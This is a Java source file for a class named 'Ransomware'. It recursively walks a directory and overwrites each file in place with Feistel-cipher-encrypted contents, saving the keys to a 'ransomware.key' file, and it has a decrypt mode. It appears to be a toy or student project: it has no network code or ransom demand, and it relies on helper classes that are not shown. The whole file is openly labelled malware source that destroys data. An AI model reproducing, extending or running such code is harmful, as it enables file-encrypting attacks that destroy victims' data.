import java.io.File;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.CharBuffer;
import java.nio.IntBuffer;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;

public class Ransomware {

    static enum Mode {
        Encrypt,
        Decrypt
    }

    static private Mode mode = Mode.Encrypt;

    public static void setMode(Mode mode) {
        Ransomware.mode = mode;
    }

    private static void processDirectory(File directory) throws IOException {
        String[] directories = directory.list();
        for (String s : directories) {
            File newFile = Path.of(directory.getAbsolutePath(), s).toFile();
            if (newFile.isDirectory()) {
                processDirectory(newFile);
            } else {
                processFile(newFile);
            }
        }
    }

    private static void processFile(File file) throws IOException {
        Path path = file.toPath();
        String fileContent = Files.readString(path);
        String encryptedContent = process(fileContent, Ransomware.mode);
        Files.writeString(path, encryptedContent);
        String prefix = Ransomware.mode == Ransomware.Mode.Encrypt ? "Encrypted " : "Decrypted ";
        System.out.println(prefix + file.getAbsolutePath());
    }

    private static List<Integer> loadKeysFromFile() throws IOException {
        Path currentPath = Path.of(System.getProperty("user.dir"), "ransomware.key");
        List<String> stringKeys = Files.readAllLines(currentPath);
        List<Integer> keys = new ArrayList<>();
        stringKeys.forEach((val) -> {
            keys.add(Integer.parseInt(val));
        });
        return keys;
    }

    private static void saveKeysToFile(List<Integer> keys) throws IOException {
        Path currentPath = Path.of(System.getProperty("user.dir"), "ransomware.key");
        String keyString = "";
        for(int key : keys) {
            keyString += "" + key + "\n";
        }
        Files.writeString(currentPath, keyString);
    }

    public static void process(Path path) throws IOException {

        if (Ransomware.mode == Mode.Encrypt) {
            List<Integer> keys = KeyGenerator.generateUniqueKeys(FesitelAlgorithm.ROUNDS);
            FesitelAlgorithm.initialize(keys);
            saveKeysToFile(keys);
        } else {
            List<Integer> keys = loadKeysFromFile();
            FesitelAlgorithm.initialize(keys);
        }

        File file = path.toFile();
        if (file.isDirectory()) {
            processDirectory(file);
        } else {
            processFile(file);
        }
    }

    private static String process(String message, Mode mode) {
        if (mode == Mode.Encrypt) {
            message = checkAndPad(message);
        }

        int[] messageBytes = convertCharArrayToIntArray(message.toCharArray());

        int[] data = switch (mode) {
            case Encrypt -> FesitelAlgorithm.encryptData(messageBytes);
            case Decrypt -> FesitelAlgorithm.decryptData(messageBytes);
        };

        String response = new String(convertIntArrayToCharArray(data));
        if (mode == Mode.Decrypt) {
            response.trim();
        }

        return response;
    }

    private static String checkAndPad(String message) {
        int length = message.length(); // Get the length of the message to be encrypted
        if (length % 4 != 0) { // If the length of the message is not a multiple of 4, pad it with the
                               // appropriate amount of whitespace
            length = 4 - (length % 4);
            String padding = "";
            for (int i = 0; i < length; ++i) {
                padding += " ";
            }
            message += padding;
        }
        return message;
    }

    private static char[] convertIntArrayToCharArray(int[] data) {
        ByteBuffer byteBuffer = ByteBuffer.allocate(data.length * 4);
        byteBuffer.order(ByteOrder.BIG_ENDIAN);
        for (int value : data) {
            byteBuffer.putInt(value);
        }
        byte[] byteArray = byteBuffer.array();
        ByteBuffer byteBufferForChar = ByteBuffer.wrap(byteArray);
        CharBuffer charBuffer = byteBufferForChar.asCharBuffer();
        char[] charArray = new char[byteArray.length / 2];
        charBuffer.get(charArray);
        return charArray;
    }

    private static int[] convertCharArrayToIntArray(char[] data) {
        ByteBuffer byteBuffer = ByteBuffer.allocate(data.length * 2);
        byteBuffer.order(ByteOrder.BIG_ENDIAN);
        for (char value : data) {
            byteBuffer.putChar(value);
        }
        byte[] byteArray = byteBuffer.array();
        ByteBuffer byteBufferForInt = ByteBuffer.wrap(byteArray);
        IntBuffer intBuffer = byteBufferForInt.asIntBuffer();
        int[] intArray = new int[byteArray.length / 4];
        intBuffer.get(intArray);
        return intArray;
    }

}
